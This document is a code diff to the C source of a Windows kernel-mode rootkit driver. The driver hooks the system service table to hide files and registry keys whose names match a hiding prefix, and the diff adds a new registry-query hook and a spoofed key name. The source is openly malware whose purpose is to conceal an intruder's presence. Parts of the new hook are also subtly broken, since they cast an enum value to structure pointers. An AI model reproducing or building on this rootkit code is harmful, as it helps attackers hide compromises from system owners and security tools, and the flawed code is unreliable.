@@ -1,4 +1,3 @@
-
 #include <ntddk.h>
 #include "rk_hook.h"
 #include "rk_DKOM.h"
@@ -16,6 +15,7 @@ NTQUERYDIRECTORYFILE		OldNtQueryDirectoryFile = NULL;
 NTCREATEFILE				OldNtCreateFile;
 ZWOPENKEY                   OldZwOpenKey;
 ZWENUMERATEKEY              OldNtEnumerateKey;
+ZWQUERYKEY                  OldNtQueryKey;
 
 BOOLEAN bHooked = FALSE;
 
@@ -47,9 +47,12 @@ VOID HookApis()
 //        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
 //        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
 
-        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
-        __asm int 3
-        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
+//        OldNtQueryKey= SYSTEMSERVICE(ZwQueryKey);
+//        SYSTEMSERVICE( ZwQueryKey ) = HookNtQueryKey; 
+
+//        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
+//        __asm int 3
+//        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
 
 		bHooked = TRUE;
 		WPON();
@@ -76,13 +79,74 @@ VOID UnHookApis()
 		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
 		
 //        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
-        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        
+//        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;
+//        SYSTEMSERVICE( ZwQueryKey ) = OldNtQueryKey;         
 
 		bHooked = FALSE;
 		WPON();
 
 		LowerIRQLevel( irql );
 	}
+}
+
+NTSTATUS HookNtQueryKey(
+	HANDLE hKey,
+	KEY_INFORMATION_CLASS KeyInfoClass,
+	PVOID KeyInfoBuffer,
+	ULONG KeyInfoBufferLength,
+	PULONG Byte
+)
+{
+  NTSTATUS rc;
+  rc = OldNtQueryKey( hKey,
+                      KeyInfoClass,
+                      KeyInfoBuffer,
+                      KeyInfoBufferLength,                    
+                      Byte);
+
+//  __asm int 3 
+
+
+  if (STATUS_SUCCESS != rc) {
+     DbgPrint("error=>leaving\n");
+     return rc;
+  }
+  
+  DbgPrint("Entered HookNtQueryKey=%ld\n",KeyInfoClass);  
+
+  if (KeyInfoClass==KeyFullInformation) {
+//     DbgPrint("KeyFullInformation\n");
+     if (KeyInfoBufferLength == sizeof(KEY_FULL_INFORMATION))
+        DbgPrint("KeyFullInformation> COUNT=%ld/%ld\n",((KEY_FULL_INFORMATION*)KeyInfoClass)->SubKeys,((KEY_FULL_INFORMATION*)KeyInfoClass)->Values);
+  }
+  else
+  if (KeyInfoClass==KeyNameInformation) {
+//     DbgPrint("KeyNameInformation\n");  
+     if (KeyInfoBufferLength == sizeof(KEY_NAME_INFORMATION) )                                          
+        DbgPrint("KeyNameInformation> NAME=%S\n",((KEY_NAME_INFORMATION*)KeyInfoClass)->Name);                                        
+  }
+  else
+  if (KeyInfoClass==KeyCachedInformation) {                                          
+//     DbgPrint("KeyCachedInformation\n");                                          
+     if (KeyInfoBufferLength == sizeof(KEY_CACHED_INFORMATION) ) {                                              
+       DbgPrint("KeyCachedInformation> COUNT=%ld/%ld\n",((KEY_CACHED_INFORMATION*)KeyInfoClass)->SubKeys,((KEY_CACHED_INFORMATION*)KeyInfoClass)->Values);
+       DbgPrint("KeyCachedInformation> NAME=%S\n",((KEY_CACHED_INFORMATION*)KeyInfoClass)->Name);
+     }     
+  }
+  else
+  if (KeyInfoClass==KeyBasicInformation) {
+//     DbgPrint("KeyBasicInformation\n");
+     if (KeyInfoBufferLength == sizeof(KEY_BASIC_INFORMATION) )                                   
+        DbgPrint("KeyBasicInformation> NAME=%S\n",((KEY_BASIC_INFORMATION*)KeyInfoClass)->Name);                                        
+  }
+  else
+  {    
+     DbgPrint("Otherclass=%ld\n",KeyInfoClass);
+  }
+
+  DbgPrint("TEST\n");
+  
+  return rc;
 }
 
 NTSTATUS 
@@ -102,7 +166,6 @@ NTSTATUS
   char KeyName[1024];
   rc=ObReferenceObjectByHandle( KeyHandle, 0, 0, KernelMode, &Object, NULL);
   if (rc==STATUS_SUCCESS) {
-//     extern NTSTATUS ObQueryNameString(void *, void *, int size, int *);
      int BytesReturned;
      rc=ObQueryNameString( Object,
                            (PUNICODE_STRING)KeyName,
@@ -135,14 +198,16 @@ NTSTATUS
 //				   wcslen( hidePrefixW ) )
      {
            DbgPrint("Detected rootkit string!\n");
-           rc = OldNtEnumerateKey(
-                KeyHandle,
-                Index-1,
-                KeyInformationClass,
-                KeyInformation,
-                Length,
-                ResultLength
-                );
+
+           wcsncpy( key, (const wchar_t*) "Windows Spoofed key name", keyLen );           
+//           rc = OldNtEnumerateKey(
+//                KeyHandle,
+//                Index-1,
+//                KeyInformationClass,
+//                KeyInformation,
+//                Length,
+//                ResultLength
+//                );
            return rc;
      }
 
@@ -212,11 +277,7 @@ NTSTATUS HookNtQueryDirectoryFile(
 	NTSTATUS rc;
 	PCHAR processName = NULL;
 	PEPROCESS currentEprocess = NULL;	
-//	CHAR aProcessName[PROCNAMELEN];                                        
-//		                                                                      
-//	GetProcessName( aProcessName );                                        
-//	DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);
-
+	
 	rc=OldNtQueryDirectoryFile(
 			hFile,							/* this is the directory handle */
 			hEvent,
@@ -342,3 +403,4 @@ BOOLEAN IsPriviligedProcess( PEPROCESS eproc )
 	}
 	return FALSE;
 }
+
